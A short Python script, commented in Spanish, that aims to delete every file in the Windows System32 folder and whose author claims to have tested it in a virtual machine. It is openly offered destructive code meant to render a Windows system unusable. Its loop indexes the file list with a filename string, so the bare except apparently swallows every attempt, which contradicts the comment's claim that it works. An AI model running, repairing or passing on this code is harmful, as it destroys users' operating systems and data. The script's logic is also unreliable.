#Elimina todos los archivos de system32 (Menos los que se estan usando), se deben tener permisos (Lo probe en una VM y si funciona xd)
import os
from os import remove
os.chdir(r"C:\Windows\System32")
routes=(os.listdir("C:\Windows\System32"))
print(len(routes))
for i in routes:
    try:
        remove(routes[i])
    except:
        print('No')
        pass    